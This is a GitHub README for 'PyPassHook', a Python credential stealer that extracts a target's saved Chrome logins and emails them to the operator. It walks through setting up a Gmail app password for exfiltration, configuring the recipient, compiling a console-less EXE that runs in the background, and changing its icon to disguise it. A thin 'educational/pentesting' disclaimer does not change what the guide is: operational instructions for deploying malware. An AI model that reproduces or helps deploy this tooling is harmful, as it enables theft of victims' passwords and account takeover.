# PyPassHook
Python script which grabs all of the targets chrome logins and bundles them into a txt file within a chosen Email. Expanded from a [GeeksForGeeks project](https://www.geeksforgeeks.org/how-to-extract-chrome-passwords-in-python/), I added Email functionality for functionality.

I considered implementing this within my [UltimateGrabber](https://github.com/MightySpaceman/Ultimategrabber/) project, however I reasoned that it would make it much to overpowered and could get out of hand when used incorrectly.

### DISCLAIMER
The creator takes no responsibility for any harm generated by misuse of this tool without permission of the target. 
UltimateGrabber is for educational/pentesting purposes only - **hacking someone without their consent is a criminal offense.** 

(Note that the following instructions are ripped from my UltimateGrabber readme because I am lazy and there is nothing you can do about it)

# Setup
To get the script to work, you will have to insert a few details into the script so that it actually sends the email to you - otherwise it would just return an error message.

## #1 - Setup Gmail Account
You may want to make a new Gmail account to handle the outgoing messages, and ensure your password is not leaked from the file, instead of just using your current one. Simply go to gmail.com and make a fresh account. There are a few things you will need to change here.

First of all, enable two-factor-authentication. Go to [myaccount.google.com](https://myaccount.google.com) and navigate to the security tab on the left. Then, scroll down until you find the 'Signing Into Google' section. Select 2-Step verification, enter your password, and follow the prompts to verify your phone number.

Now you will need to add what is known as an app password - these are random strings of letters that allow an external application to log into your Email account to start sending messages. If you just used your normal password in the code, google would reject the login request because it is a third-party application. If you use an application key in its place, however, google will allow the script to log in.

Below where you found the option to turn on 2-Step verification, you will find a new option titled 'App passwords'. Click it, and you will be asked for your password again. When the page loads select the drop-down which says 'Select app'. Set its value to other, and change it to whatever you like, something like 'Python' or 'grabber'. Click generate. A popup on the screen will appear with a yellow box containing a string of letters - this is your App password. Copy it with Control+C. You will not be able to view that specific password again, so keep it safe by inserting it into the script as soon as possible.

## #2 Installing required modules
Download this repository, and unzip it to your folder of choice. Open the folder, and right click on the path bar above the file list. Click 'Copy adress as text'
Next, open command prompt. Type `cd`, space, and Control+V to paste. Press enter. Then type `pip install -r requirements.txt`. Wait for python to finish installing the modules, and you are done.

## #3 - Insert App Password Into Script
Navigate to the bottom of the python script titled 'main.py'. 16 lines above the bottom (Line 44), you will find a series of variables that look like this:
`sender = "email@gmail.com"`
`recipient = "recipient@gmail.com"`
`app_password = "app password here"`.
Change the `sender` variable to hold the Gmail adress that you just set up.
Change the `recipient` value to the email adress you want to send the logs to. To make things less complicated, you can just change this to the sending Gmail adress, so it emails the logs to itself. Just declare this with `recipient = sender`. The lower section should now look like this:

![image](https://user-images.githubusercontent.com/83145315/186371119-151275d4-2cb0-4747-81b6-5f7182f63fce.png)

## #4 - Bundle Into EXE file 
This next step is technically optional, but necesary if you want the script to run on a computer without python or any of the script's modules installed.

To compile the code into an EXE file, we will be using the pyinstaller python module. If you don't have pyinstaller installed, you can do it easily by opening windows command prompt and typing `pip install pyinstaller`. Wait until it finishes installing.

Compiling the code is actually pretty easy. Open the folder that contains the python file you downloaded, and right click on the path bar above the file list. Click 'Copy adress as text'

![image](https://user-images.githubusercontent.com/83145315/186372995-bc75cb7a-f2aa-4775-abed-59f580fc38a4.png)

Open command prompt once more. Now, type `cd`, spacebar, then Control+V to paste the file path you just copied. Hit enter.

![image](https://user-images.githubusercontent.com/83145315/186373786-2e9c5a16-656f-470c-b463-9a1dac19cd40.png)

Now, type in `pyinstaller --onefile --noconsole UltimateGrabber.py` and hit enter. Pyinstaller will take about 20 seconds to compile the code. Afterwards, go check the folder which you had saved the python file again. You will see two new folders, titled `build` and `dist`. Inside `dist`, you will find an EXE file - success! you have successfully turned it into a portable executable. You can change the cover icon of the EXE using a tool such as [Resource Hacker](http://www.angusj.com/resourcehacker/#download) if you please.

If you run it, you will find a new email in you inbox - it will look something like this. It will take about 50 seconds to do its job, but does so in the background.

![image](https://user-images.githubusercontent.com/83145315/187166295-977a6c99-c401-422d-945f-59260388566e.png)

You can now move the EXE file around wherever you want, and it will still work.
